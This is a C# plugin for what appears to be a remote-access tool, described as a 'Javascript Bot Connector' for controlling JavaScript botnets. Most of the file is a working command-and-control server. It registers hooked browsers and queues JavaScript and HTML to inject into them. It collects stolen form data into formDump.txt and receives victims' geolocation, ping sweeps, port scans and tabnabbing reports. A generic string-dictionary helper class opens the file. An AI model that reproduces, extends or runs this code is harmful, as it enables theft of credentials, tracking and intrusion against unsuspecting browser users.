using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using sCore;
using System.Net.Sockets;
using sCore.IO;
using System.Windows.Forms;
using System.Net;
using System.Drawing;
using System.IO;

namespace WebPlugin
{
    public class VDictionary //String only
    {
        List<KeyValuePair<string, string>> kvp = new List<KeyValuePair<string, string>>();
        public IEnumerable<KeyValuePair<string, string>> Items
        {
            get
            {
                foreach (KeyValuePair<string, string> lvp in kvp)
                {
                    yield return lvp;
                }
            }
        }

        public int Count
        {
            get { return kvp.Count; }
        }

        public List<string> Keys
        {
            get
            {
                List<string> temp = new List<string>();
                foreach (KeyValuePair<string, string> lvp in kvp)
                {
                    temp.Add(lvp.Key);
                }

                return temp;
            }
        }

        public List<string> Values
        {
            get
            {
                List<string> temp = new List<string>();
                foreach (KeyValuePair<string, string> lvp in kvp)
                {
                    temp.Add(lvp.Value);
                }

                return temp;
            }
        }

        public string this[string index]
        {
            get
            {
                return At(index);
            }

            set
            {
                SetOne(index, value);
            }
        }

        public void SetOne(string key, string newText)
        {
            int i = 0;
            bool canSet = false;

            foreach (KeyValuePair<string, string> lvp in kvp)
            {
                if (lvp.Key == key)
                {
                    canSet = true;
                    break;
                }
                i++;
            }

            if (canSet) SetByIndex(i, newText);
        }

        public void SetByIndex(int index, string newText)
        {
            kvp[index] = new KeyValuePair<string, string>(kvp[index].Key, newText);
        }

        public void SetByIndex(int[] indicies, string[] newText)
        {
            int loopIndex = 0;
            foreach (int i in indicies)
            {
                SetByIndex(i, newText[loopIndex]);
                loopIndex++;
            }
        }

        public void SetAll(string key, string value)
        {
            foreach (KeyValuePair<string, string> lvp in kvp)
            {
                if (lvp.Key == key)
                {
                    SetOne(key, value);
                }
            }
        }

        /// <summary>
        /// Add's an element into the Dictionary
        /// </summary>
        /// <param name="key">The key of the element (can be a duplicate)</param>
        /// <param name="value">The value of the element (can be a dublicate)</param>

        public void Add(string key, string value)
        {
            KeyValuePair<string, string> current = new KeyValuePair<string, string>(key, value);
            kvp.Add(current);
        }

        /// <summary>
        /// Remove's the first element having the same key as specified
        /// </summary>
        /// <param name="key">The key of the element to be removed</param>

        public void RemoveByKey(string key)
        {
            int index = 0;
            bool canRemove = false;
            foreach (KeyValuePair<string, string> lvp in kvp)
            {
                if (lvp.Key == key)
                {
                    canRemove = true;
                    break;
                }

                index++;
            }

            if (canRemove) kvp.RemoveAt(index);
        }

        /// <summary>
        /// Remove's all element having the same key as specified
        /// </summary>
        /// <param name="key">The key of the element(s) you want to remove</param>

        public void RemoveAllByKey(string key)
        {
            List<int> temp = new List<int>();
            int index = 0;

            foreach (KeyValuePair<string, string> lvp in kvp)
            {
                if (lvp.Key == key)
                {
                    temp.Add(index);
                }

                index++;
            }

            if (temp.Count > 0)
            {
                RemoveByIndex(temp.ToArray());
            }
        }

        /// <summary>
        /// Remove's all element from the dictionary
        /// </summary>

        public void Clear()
        {
            kvp.Clear();
        }

        /// <summary>
        /// Remove's an element with the specified index form the dictionary
        /// </summary>
        /// <param name="index">The index of the item you want ot remove</param>

        public void RemoveByIndex(int index)
        {
            kvp.RemoveAt(index);
        }

        /// <summary>
        /// Remove's multiple items specified by the indices array
        /// </summary>
        /// <param name="indicies">The int array of the element id's which you want to remove</param>

        public void RemoveByIndex(int[] indicies)
        {
            for (int i = 0; i < indicies.Length; i++)
            {
                int cIndex = indicies[i];
                kvp.RemoveAt(cIndex);
                for (int c = i; c < indicies.Length; c++)
                {
                    int lci = indicies[c];
                    if (lci > cIndex)
                    {
                        indicies[c] -= 1;
                    }
                }
            }
        }

        /// <summary>
        /// Read's the first element with the specified key
        /// </summary>
        /// <param name="key">The key of the element</param>
        /// <returns>String value</returns>

        public string At(string key)
        {
            int index = 0;

            foreach (KeyValuePair<string, string> lvp in kvp)
            {
                if (lvp.Key == key)
                {
                    return At(index);
                }

                index++;
            }

            return null;
        }

        /// <summary>
        /// Read's the value of an element based on the index specified
        /// </summary>
        /// <param name="index">Index of the element</param>
        /// <returns>String value</returns>

        public string At(int index)
        {
            if (index >= kvp.Count || kvp.Count == 0) return null;
            string value = kvp[index].Value;
            return value;
        }

        /// <summary>
        /// Read's multiple items with the same key
        /// </summary>
        /// <param name="key">The key of the item(s)</param>
        /// <returns>String array of values</returns>

        public IEnumerable<string> GetMultipleItems(string key)
        {
            int index = 0;

            foreach (KeyValuePair<string, string> lvp in kvp)
            {
                if (lvp.Key == key)
                {
                    yield return At(index);
                }

                index++;
            }
        }

        /// <summary>
        /// Read's multiple items based on the indeicies
        /// </summary>
        /// <param name="indicies">The indicies of the requested values</param>
        /// <returns>String array of values</returns>

        public IEnumerable<string> GetMultipleItems(int[] indicies)
        {
            foreach (int i in indicies)
            {
                yield return kvp[i].Value;
            }
        }

        /// <summary>
        /// Read's wheter you have at least one element with the specified key
        /// </summary>
        /// <param name="key">The key of the element you want to search</param>
        /// <returns>True if element with the key is present</returns>

        public bool ContainsKey(string key)
        {
            foreach (KeyValuePair<string, string> lvp in kvp)
            {
                if (lvp.Key == key) return true;
            }

            return false;
        }

        /// <summary>
        /// Read's wheter at least one element with the same value exists
        /// </summary>
        /// <param name="value">The value of the element to search</param>
        /// <returns>True if the value is in at least on of the elements</returns>

        public bool ContainsValue(string value)
        {
            foreach (KeyValuePair<string, string> lvp in kvp)
            {
                if (lvp.Value == value) return true;
            }

            return false;
        }
    }

    public class Class1 : IPluginMain
    {
        public string ScriptName { get; set; } = "Javascript Bot Connector";
        public Version Scriptversion { get; set; } = new Version(1, 0);
        public string AuthorName { get; set; } = "Advanced Hacking 101";
        public Permissions[] ScriptPermissions { get; set; } = { Permissions.Display };
        public string ScriptDescription { get; set; } = "Provides connection/interaction with Javascript botnets";
        private Socket _serverSocket;
        private Dictionary<string, DateTime> _clientList = new Dictionary<string, DateTime>();
        private VDictionary commandPoll = new VDictionary();
        private int reservedIds = 0;
        private bool blockCommands = false;
        private object pollLock = new object();
        private string currentClient = "";
        private RichTextBox output;
        private ComboBox peerList;

        public void Main()
        {
            sCore.Intergration.Integrate.SetPlugin(this);
            sCore.Intergration.MainFunction main = new sCore.Intergration.MainFunction(PMain);
            sCore.Intergration.Integrate.StartPluginThread(main);
            Console.WriteLine("Init completed");
        }

        private void ItemChangedHandler(object sender, EventArgs e)
        {
            ComboBox cb = (ComboBox)sender;

            if (cb.SelectedItem != null)
            {
                currentClient = cb.SelectedItem.ToString();
                output.Clear();
            }
        }

        private void KeyDownHandler(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Return)
            {
                if (blockCommands || currentClient == "") return;
                TextBox input = (TextBox)sender;
                string cmd = input.Text;
                if (cmd == "cls" || cmd == "clear") output.Clear();
                if (cmd.StartsWith("append-html "))
                {
                    string file = cmd.Substring(12);
                    string html = "";
                    if (File.Exists(file)) html = File.ReadAllText(file);
                    else html = file;
                    html = html.Replace(Environment.NewLine, string.Empty);
                    html = html.Replace("\"", "\\\"");
                    html = html.Replace("\t", string.Empty);
                    html = html.Trim();
                    cmd = "append-html " + html;
                }
                if (cmd.StartsWith("push-html "))
                {
                    string file = cmd.Substring(10);
                    string html = "";
                    if (File.Exists(file)) html = File.ReadAllText(file);
                    else html = file;
                    html = html.Replace(Environment.NewLine, string.Empty);
                    html = html.Replace("\"", "\\\"");
                    html = html.Replace("\t", string.Empty);
                    html = html.Trim();
                    cmd = "push-html " + html;
                }
                if (cmd.StartsWith("execute-js "))
                {
                    string file = cmd.Substring(11);
                    string js = "";
                    if (File.Exists(file)) js = File.ReadAllText(file);
                    else js = file;
                    js = js.Replace(Environment.NewLine, string.Empty);
                    js = js.Replace("\"", "\\\"");
                    js = js.Replace("\t", string.Empty);
                    js = js.Trim();
                    cmd = "execute-js " + js;
                }
                e.SuppressKeyPress = true;
                input.Clear();
                commandPoll.Add(currentClient, cmd);
                if (output != null) output.AppendText("[Server->Client]: " + cmd + Environment.NewLine);
            }
        }

        private void CreateUI()
        {
            TabControl tc = sCore.UI.CommonControls.mainTabControl;

            if (tc.InvokeRequired)
            {
                VoidDelegate vd = new VoidDelegate(CreateUI);
                tc.Invoke(vd);
                return;
            }

            TabPage tp = new TabPage();
            tp.Name = "page_WebExt";
            tp.Text = "JS Control";
            tp.BackColor = SystemColors.Window;

            ComboBox cb = new ComboBox();
            cb.Name = "js_selectClient";
            cb.Text = "Select a client";
            cb.Size = new Size(200, 20);
            cb.Location = new Point(25, 25);
            cb.SelectedIndexChanged += new EventHandler(ItemChangedHandler);
            peerList = cb;

            Label cmdLabel = new Label();
            cmdLabel.Text = "Command:";
            cmdLabel.Location = new Point(25, 70);
            cmdLabel.AutoSize = true;

            TextBox cmdInput = new TextBox();
            cmdInput.Size = new Size(500, 20);
            cmdInput.Location = new Point(100, 68);
            cmdInput.KeyDown += new KeyEventHandler(KeyDownHandler);

            Label outputLabel = new Label();
            outputLabel.AutoSize = true;
            outputLabel.Location = new Point(25, 115);
            outputLabel.Text = "Output:";

            RichTextBox outputBox = new RichTextBox();
            outputBox.ReadOnly = true;
            outputBox.BackColor = SystemColors.Control;
            outputBox.Size = new Size(tc.Size.Width - 25 - 50, tc.Size.Height - 190);
            outputBox.Location = new Point(25, 140);
            output = outputBox;

            tp.Controls.AddRange(new Control[] { cb, cmdLabel, cmdInput, outputLabel, outputBox });
            tc.TabPages.Add(tp);
        }

        private int GetPort()
        {
            Types.InputBoxValue ret = sCore.RAT.ServerSettings.ShowInputBox("Please eneter the server port", "Enter a port for the Bot listener to run on");
            if (ret.dialogResult != DialogResult.OK) return -1;
            int portNumber = -1;
            int.TryParse(ret.result, out portNumber);
            if (portNumber == -1)
            {
                sCore.RAT.ServerSettings.ShowMessageBox("You entered an invalid value", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return GetPort();
            }
            else return portNumber;
        }

        private struct MessageData
        {
            public byte[] buffer;
            public Socket sender;
        }

        private void AcceptClient(IAsyncResult ar)
        {
            Console.WriteLine("Client connected!");
            Socket s = _serverSocket.EndAccept(ar); //The connected client
            //Don't log clients in a list, because they will disconnect after the response(HTTP), there is no persistent connection
            MessageData md = new MessageData()
            {
                buffer = new byte[1024],
                sender = s
            };

            s.BeginReceive(md.buffer, 0, md.buffer.Length, SocketFlags.None, new AsyncCallback(ReadCallback), md);
        }

        private Dictionary<string, string> GetRequestParams(string requestString)
        {
            String[] lines = requestString.Split('\n');
            List<string> reqLines = new List<string>();
            Dictionary<string, string> dict = new Dictionary<string, string>();

            foreach (string line in lines)
            {
                reqLines.Add(line.Replace("\r", String.Empty));
            }

            lines = reqLines.ToArray();
            reqLines.Clear();
            reqLines = null;

            string pLine = lines[0];
            int qPos = pLine.IndexOf('?');
            pLine = pLine.Substring(qPos + 1, pLine.Length - qPos - 1);
            pLine = pLine.Replace(" HTTP/1.1", String.Empty);
            if (pLine.Contains("&"))
            {
                String[] ps = pLine.Split('&');

                foreach (string p in ps)
                {
                    String[] param = p.Split('=');
                    dict.Add(param[0], param[1]);
                }
            }
            else
            {
                String[] param = pLine.Split('=');
                dict.Add(param[0], param[1]);
            }

            return dict;
        }

        private string GetNextCommand(string clientID)
        {
            Monitor.Enter(pollLock);
            if (commandPoll.ContainsKey(clientID))
            {
                string cmd = commandPoll.At(clientID);
                commandPoll.RemoveByKey(clientID);
                Monitor.Exit(pollLock);
                return cmd;
            }
            else
            {
                Monitor.Exit(pollLock);
                return null;
            }
        }

        private void CleanThread()
        {
            while (true)
            {
                List<string> flagged = new List<string>();

                foreach (KeyValuePair<string, DateTime> kvp in _clientList)
                {
                    DateTime cmp = DateTime.Now;
                    TimeSpan diff = cmp - kvp.Value;
                    if (diff.TotalSeconds >= 50) flagged.Add(kvp.Key); //if a client didn't responded in the last 50 seconds, flag it
                }

                if (flagged.Count > 0) //inactive clients detected
                {
                    blockCommands = true; //Block user from issuing commands
                    Monitor.Enter(pollLock); //Lock commandPoll, because a list operation is might be going on in GetNextCommand
                    foreach (string rclient in flagged)
                    {
                        commandPoll.RemoveAllByKey(rclient); //Remove commands tasked for unresponsive clients
                        _clientList.Remove(rclient); //Remove inactive clients from clientList
                        if (currentClient == rclient) DisconnectCurrent(); //if the current client is inactive set the current client to nothing
                    }
                    Monitor.Exit(pollLock); //Release lock, because we no longer manipulate the commandPoll obj
                    while (commandPoll.Count != 0) Thread.Sleep(1000); //wait for active clients to process all commands

                    reservedIds = 0; //reset the reserved ids
                    ClearListClient(); //Remove all client entries from combobox

                    int compareID = int.Parse(flagged[0].Substring(6));

                    foreach (string clientName in _clientList.Keys) //go through all clients
                    {
                        int clientID = int.Parse(clientName.Substring(6));

                        if (!flagged.Contains(clientName) && clientID > compareID) //Filter inactive clients
                        {
                            commandPoll.Add(clientName, "reassign"); //add a command to request new client id to all active clients
                        }
                    }

                    //Clients will now request new client IDs wait 12 seconds for that
                    Thread.Sleep(12000);

                    blockCommands = false; //Let the user issue commands again
                }

                Thread.Sleep(5000);
            }
        }

        private void ClearListClient()
        {
            if (peerList.InvokeRequired)
            {
                VoidDelegate vd = new VoidDelegate(ClearListClient);
                peerList.Invoke(vd);
                return;
            }

            peerList.Items.Clear();
            peerList.SelectedItem = null;
            peerList.Text = "";
        }

        private void DisconnectCurrent()
        {
            if (output.InvokeRequired)
            {
                VoidDelegate vd = new VoidDelegate(DisconnectCurrent);
                output.Invoke(vd);
                return;
            }
            currentClient = "";
            output.Text = "";
        }

        private void AddListClient(string clientName)
        {
            if (peerList.InvokeRequired)
            {
                StringDelegate sd = new StringDelegate(AddListClient);
                peerList.Invoke(sd, new object[] { clientName });
                return;
            }

            peerList.Items.Add(clientName);
        }

        private void RemoveListClient(string clientName)
        {
            if (peerList.InvokeRequired)
            {
                StringDelegate sd = new StringDelegate(AddListClient);
                peerList.Invoke(sd, new object[] { clientName });
                return;
            }

            peerList.Items.Remove(clientName);
        }

        private void ReadCallback(IAsyncResult ar)
        {
            MessageData md = (MessageData)ar.AsyncState;
            int read = md.sender.EndReceive(ar);
            Console.WriteLine("Reading from stream " + read.ToString() + " bytes");
            if (read > 0)
            {
                byte[] data = new byte[read];
                Array.ConstrainedCopy(md.buffer, 0, data, 0, read);
                string text = Encoding.ASCII.GetString(data);

                Dictionary<string, string> dict = GetRequestParams(text);
                Dictionary<string, string> d = new Dictionary<string, string>();

                string cmd = dict["command"];
                Console.WriteLine(cmd);

                if (cmd == "register")
                {
                    Console.WriteLine("In registration");
                    string clientID = "Client" + reservedIds.ToString();
                    _clientList.Add(clientID, DateTime.Now.AddSeconds(1)); //Add 1 second for next poll
                    AddListClient(clientID);
                    reservedIds++;
                    d.Add("result", clientID);
                    SendResponse(d, md.sender);
                }
                else if (cmd == "getCommand")
                {
                    string rcmd = GetNextCommand(dict["client"]);
                    if (rcmd == null) rcmd = "";
                    d.Add("result", rcmd);
                    _clientList[dict["client"]] = DateTime.Now;
                    SendResponse(d, md.sender);
                }
                else if (cmd == "feedback")
                {
                    string msg = dict["text"];
                    if (currentClient == dict["client"]) AppendResponse(msg);
                    d.Add("status", "received");
                    SendResponse(d, md.sender);
                }
                else if (cmd == "formData")
                {
                    string client = dict["client"];
                    string dump = dict["formDump"];
                    string site = dict["site"];
                    dump = Uri.UnescapeDataString(dump);
                    site = Uri.UnescapeDataString(site);

                    string format = client + " - " + site + Environment.NewLine + dump + Environment.NewLine;
                    WriteFormData(format);
                    d.Add("sample", "sample");
                    SendResponse(d, md.sender);
                }
                else if (cmd == "storeLocation")
                {
                    string client = dict["client"];
                    string message = "200 Success on requeting geolocation\r\n" + client + " responded with: lat:" + dict["latitude"] + "; lng: " + dict["longitude"];
                    AppendResponse(message);
                    d.Add("sample", "sample");
                    SendResponse(d, md.sender);
                }
                else if (cmd == "errorLocation")
                {
                    string client = dict["client"];
                    string message = "404 Geolocation failed on target!\r\n" + client + "Responded with: " + dict["message"];
                    AppendResponse(message);
                    d.Add("sample", "sample");
                    SendResponse(d, md.sender);
                }
                else if (cmd == "pingResult")
                {
                    string client = dict["client"];
                    string message = "200 Ping sweep finished on target!\r\n" + client + " Responded with: " + dict["result"];
                    AppendResponse(message);
                    d.Add("sample", "sample");
                    SendResponse(d, md.sender);
                }
                else if (cmd == "portResult")
                {
                    string client = dict["client"];
                    string message = "200 Port Scan completed\r\n" + client + " responded with: " + dict["message"];
                    AppendResponse(message);
                    d.Add("sample", "sample");
                    SendResponse(d, md.sender);
                }
                else if (cmd == "tabNabReport")
                {
                    string client = dict["client"];
                    string message = "200 " + client + " tab nab activated, site changed to: " + dict["site"];
                    d.Add("sample", "sample");
                    SendResponse(d, md.sender);
                }
                else
                {
                    AppendResponse("Invalid command received.\r\nIgnoring request and continuing tasks");
                }

                try
                {
                    md.buffer = new byte[1024];
                    md.sender.BeginReceive(md.buffer, 0, md.buffer.Length, SocketFlags.None, new AsyncCallback(ReadCallback), md);
                }
                catch (Exception)
                {
                    md.sender.Disconnect(false);
                    md.sender.Close();
                    md.sender.Dispose();
                    md.sender = null;
                }
            }
            else
            {
                md.sender.Disconnect(false);
                md.sender.Close();
                md.sender.Dispose();
                md.sender = null;
            }
        }

        private void WriteFormData(string fd)
        {
            const string dumpFile = "formDump.txt";
            if (!File.Exists(dumpFile)) File.Create(dumpFile).Close();
            string fileContent = File.ReadAllText(dumpFile);
            fileContent += fd;
            File.WriteAllText(dumpFile, fileContent);
        }

        private void AppendResponse(string response)
        {
            if (output.InvokeRequired)
            {
                StringDelegate sd = new StringDelegate(AppendResponse);
                output.Invoke(sd, new object[] { response });
                return;
            }

            response = Uri.UnescapeDataString(response);

            output.AppendText("[Client->Server]: " + response + Environment.NewLine);
        }

        private void SendResponse(Dictionary<string, string> dict, Socket client)
        {
            string json = "{";

            foreach (KeyValuePair<string, string> kvp in dict)
            {
                json += "\"" + kvp.Key + "\": \"" + kvp.Value + "\",";
            }

            json = json.Substring(0, json.Length - 1);
            json += "}";
            Console.WriteLine("Result JSON: " + json);
            byte[] content = Encoding.ASCII.GetBytes(json);
            string resp = "HTTP/1.1 200 OK\r\nServer: ratServer\r\nContent-Length: " + content.Length + "\r\nContent-Type: application/json\r\nAccess-Control-Allow-Origin: *\r\n\r\n";
            byte[] header = Encoding.ASCII.GetBytes(resp);
            byte[] total = new byte[resp.Length + content.Length];
            Array.Copy(header, total, header.Length);
            Array.ConstrainedCopy(content, 0, total, header.Length, content.Length);
            client.Send(total);
        }

        public void PMain()
        {
            int port = GetPort();
            if (port == -1) return;
            Thread t = new Thread(new ThreadStart(CleanThread));
            t.Start();
            _serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            IPEndPoint ep = new IPEndPoint(IPAddress.Any, port);
            _serverSocket.Bind(ep);
            _serverSocket.Listen(5);
            _serverSocket.BeginAccept(new AsyncCallback(AcceptClient), null);
            CreateUI();
            Console.WriteLine("Setup completed");
        }

        public void OnExit()
        {
            //Clear, dispose commandPoll
            commandPoll.Clear();
            commandPoll = null;
            //Disconnect, dispose, close the serverSocket
            _serverSocket.Disconnect(false);
            _serverSocket.Close();
            _serverSocket.Dispose();
            _serverSocket = null;
            //Clear and dispose the client list
            _clientList.Clear();
            _clientList = null;
        }
    }
}
